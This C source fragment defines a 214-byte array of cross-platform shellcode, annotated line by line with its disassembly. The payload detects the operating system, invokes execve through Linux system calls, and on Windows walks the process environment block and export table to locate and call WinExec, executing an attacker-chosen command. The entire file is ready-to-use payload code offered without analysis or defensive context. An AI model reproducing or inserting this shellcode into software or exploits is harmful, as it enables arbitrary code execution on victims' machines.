
#define EXEC_SIZE 214

char EXEC[] = {
  /* 0000 */ "\x56"                         /* push esi                        */
  /* 0001 */ "\x57"                         /* push edi                        */
  /* 0002 */ "\x53"                         /* push ebx                        */
  /* 0003 */ "\x55"                         /* push ebp                        */
  /* 0004 */ "\x31\xc9"                     /* xor ecx, ecx                    */
  /* 0006 */ "\xf7\xe1"                     /* mul ecx                         */
  /* 0008 */ "\x50"                         /* push eax                        */
  /* 0009 */ "\x50"                         /* push eax                        */
  /* 000A */ "\x50"                         /* push eax                        */
  /* 000B */ "\x50"                         /* push eax                        */
  /* 000C */ "\x50"                         /* push eax                        */
  /* 000D */ "\xeb\x4b"                     /* jmp 0x5a                        */
  /* 000F */ "\x5f"                         /* pop edi                         */
  /* 0010 */ "\xb1\x07"                     /* mov cl, 0x7                     */
  /* 0012 */ "\x50"                         /* push eax                        */
  /* 0013 */ "\x57"                         /* push edi                        */
  /* 0014 */ "\xf2\xae"                     /* repne scasb                     */
  /* 0016 */ "\xaa"                         /* stosb                           */
  /* 0017 */ "\x57"                         /* push edi                        */
  /* 0018 */ "\x66\xaf"                     /* scasw                           */
  /* 001A */ "\xaa"                         /* stosb                           */
  /* 001B */ "\x57"                         /* push edi                        */
  /* 001C */ "\x54"                         /* push esp                        */
  /* 001D */ "\x57"                         /* push edi                        */
  /* 001E */ "\x41"                         /* inc ecx                         */
  /* 001F */ "\xe3\x22"                     /* jecxz 0x43                      */
  /* 0021 */ "\x66\x8c\xe9"                 /* mov cx, gs                      */
  /* 0024 */ "\xe3\x36"                     /* jecxz 0x5c                      */
  /* 0026 */ "\x54"                         /* push esp                        */
  /* 0027 */ "\x58"                         /* pop eax                         */
  /* 0028 */ "\xc1\xe8\x18"                 /* shr eax, 0x18                   */
  /* 002B */ "\x74\x2f"                     /* jz 0x5c                         */
  /* 002D */ "\xb0\x0b"                     /* mov al, 0xb                     */
  /* 002F */ "\x99"                         /* cdq                             */
  /* 0030 */ "\x5b"                         /* pop ebx                         */
  /* 0031 */ "\x59"                         /* pop ecx                         */
  /* 0032 */ "\x52"                         /* push edx                        */
  /* 0033 */ "\x51"                         /* push ecx                        */
  /* 0034 */ "\x53"                         /* push ebx                        */
  /* 0035 */ "\x54"                         /* push esp                        */
  /* 0036 */ "\x66\x8c\xef"                 /* mov di, gs                      */
  /* 0039 */ "\x66\xc1\xef\x08"             /* shr di, 0x8                     */
  /* 003D */ "\x75\x02"                     /* jnz 0x41                        */
  /* 003F */ "\xcd\x80"                     /* int 0x80                        */
  /* 0041 */ "\xcd\x91"                     /* int 0x91                        */
  /* 0043 */ "\xb0\x06"                     /* mov al, 0x6                     */
  /* 0045 */ "\x6a\xff"                     /* push 0xffffffff                 */
  /* 0047 */ "\x5f"                         /* pop edi                         */
  /* 0048 */ "\x0f\x05"                     /* syscall                         */
  /* 004A */ "\x3c\x05"                     /* cmp al, 0x5                     */
  /* 004C */ "\x74\x0e"                     /* jz 0x5c                         */
  /* 004E */ "\x3c\x08"                     /* cmp al, 0x8                     */
  /* 0050 */ "\x74\x0a"                     /* jz 0x5c                         */
  /* 0052 */ "\x6a\x3b"                     /* push 0x3b                       */
  /* 0054 */ "\x58"                         /* pop eax                         */
  /* 0055 */ "\x99"                         /* cdq                             */
  /* 0056 */ "\x5f"                         /* pop edi                         */
  /* 0057 */ "\x5e"                         /* pop esi                         */
  /* 0058 */ "\x0f\x05"                     /* syscall                         */
  /* 005A */ "\xeb\x75"                     /* jmp 0xd1                        */
  /* 005C */ "\x58"                         /* pop eax                         */
  /* 005D */ "\x58"                         /* pop eax                         */
  /* 005E */ "\x58"                         /* pop eax                         */
  /* 005F */ "\x58"                         /* pop eax                         */
  /* 0060 */ "\x59"                         /* pop ecx                         */
  /* 0061 */ "\x58"                         /* pop eax                         */
  /* 0062 */ "\x40"                         /* inc eax                         */
  /* 0063 */ "\x92"                         /* xchg edx, eax                   */
  /* 0064 */ "\x74\x16"                     /* jz 0x7c                         */
  /* 0066 */ "\x50"                         /* push eax                        */
  /* 0067 */ "\x51"                         /* push ecx                        */
  /* 0068 */ "\x64\x8b\x72\x2f"             /* mov esi, [fs:edx+0x2f]          */
  /* 006C */ "\x8b\x76\x0c"                 /* mov esi, [esi+0xc]              */
  /* 006F */ "\x8b\x76\x0c"                 /* mov esi, [esi+0xc]              */
  /* 0072 */ "\xad"                         /* lodsd                           */
  /* 0073 */ "\x8b\x30"                     /* mov esi, [eax]                  */
  /* 0075 */ "\x8b\x7e\x18"                 /* mov edi, [esi+0x18]             */
  /* 0078 */ "\xb2\x50"                     /* mov dl, 0x50                    */
  /* 007A */ "\xeb\x17"                     /* jmp 0x93                        */
  /* 007C */ "\xb2\x60"                     /* mov dl, 0x60                    */
  /* 007E */ "\x65\x48"                     /* dec eax                         */
  /* 0080 */ "\x8b\x32"                     /* mov esi, [edx]                  */
  /* 0082 */ "\x48"                         /* dec eax                         */
  /* 0083 */ "\x8b\x76\x18"                 /* mov esi, [esi+0x18]             */
  /* 0086 */ "\x48"                         /* dec eax                         */
  /* 0087 */ "\x8b\x76\x10"                 /* mov esi, [esi+0x10]             */
  /* 008A */ "\x48"                         /* dec eax                         */
  /* 008B */ "\xad"                         /* lodsd                           */
  /* 008C */ "\x48"                         /* dec eax                         */
  /* 008D */ "\x8b\x30"                     /* mov esi, [eax]                  */
  /* 008F */ "\x48"                         /* dec eax                         */
  /* 0090 */ "\x8b\x7e\x30"                 /* mov edi, [esi+0x30]             */
  /* 0093 */ "\x03\x57\x3c"                 /* add edx, [edi+0x3c]             */
  /* 0096 */ "\x8b\x5c\x17\x28"             /* mov ebx, [edi+edx+0x28]         */
  /* 009A */ "\x8b\x74\x1f\x20"             /* mov esi, [edi+ebx+0x20]         */
  /* 009E */ "\x48"                         /* dec eax                         */
  /* 009F */ "\x01\xfe"                     /* add esi, edi                    */
  /* 00A1 */ "\x8b\x54\x1f\x24"             /* mov edx, [edi+ebx+0x24]         */
  /* 00A5 */ "\x0f\xb7\x2c\x17"             /* movzx ebp, word [edi+edx]       */
  /* 00A9 */ "\x48"                         /* dec eax                         */
  /* 00AA */ "\x8d\x52\x02"                 /* lea edx, [edx+0x2]              */
  /* 00AD */ "\xad"                         /* lodsd                           */
  /* 00AE */ "\x81\x3c\x07\x57\x69\x6e\x45" /* cmp dword [edi+eax], 0x456e6957 */
  /* 00B5 */ "\x75\xee"                     /* jnz 0xa5                        */
  /* 00B7 */ "\x8b\x74\x1f\x1c"             /* mov esi, [edi+ebx+0x1c]         */
  /* 00BB */ "\x48"                         /* dec eax                         */
  /* 00BC */ "\x01\xfe"                     /* add esi, edi                    */
  /* 00BE */ "\x8b\x34\xae"                 /* mov esi, [esi+ebp*4]            */
  /* 00C1 */ "\x48"                         /* dec eax                         */
  /* 00C2 */ "\x01\xf7"                     /* add edi, esi                    */
  /* 00C4 */ "\x99"                         /* cdq                             */
  /* 00C5 */ "\xff\xd7"                     /* call edi                        */
  /* 00C7 */ "\x58"                         /* pop eax                         */
  /* 00C8 */ "\x58"                         /* pop eax                         */
  /* 00C9 */ "\x58"                         /* pop eax                         */
  /* 00CA */ "\x58"                         /* pop eax                         */
  /* 00CB */ "\x58"                         /* pop eax                         */
  /* 00CC */ "\x5d"                         /* pop ebp                         */
  /* 00CD */ "\x5b"                         /* pop ebx                         */
  /* 00CE */ "\x5f"                         /* pop edi                         */
  /* 00CF */ "\x5e"                         /* pop esi                         */
  /* 00D0 */ "\xc3"                         /* ret                             */
  /* 00D1 */ "\xe8\x39\xff\xff\xff"         /* call 0xf                        */
};